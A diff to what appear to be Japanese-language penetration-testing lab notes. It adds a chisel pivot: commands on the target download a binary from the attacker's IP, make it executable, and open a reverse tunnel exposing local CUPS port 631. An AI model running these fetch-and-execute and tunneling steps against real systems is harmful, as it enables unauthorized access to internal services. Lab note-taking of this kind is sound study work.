@@ -145,6 +145,9 @@ tcp6       0      0 :::60002                :::*                    LISTEN      
 ...
 ```
 
+- [[#トンネリング]]したうえで、ポート631にアクセスすると、CUPS 2.3.1にアクセスできる
+![[Pasted image 20260215135425.png]]
+
 ---
 
 ## Cron
@@ -366,10 +369,15 @@ su: Authentication failure
 ```sh
 # attacker
 wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz
-
+mv ~/Downloads/chisel_1.11.3_linux_amd64.gz .
 gunzip chisel_1.11.3_linux_amd64.gz
-sudo python -m http.server 443
+sudo python -m http.server 80
+
+sudo chisel server --port 443 --reverse
 
 # target
-
+wget 192.168.45.215:443/chisel_1.11.3_linux_amd64
+chmod +x chisel_1.11.3_linux_amd64
+./chisel_1.11.3_linux_amd64 client 192.168.45.215:443 R:631:127.0.0.1:631
 ```
+![[Pasted image 20260215135249.png]]
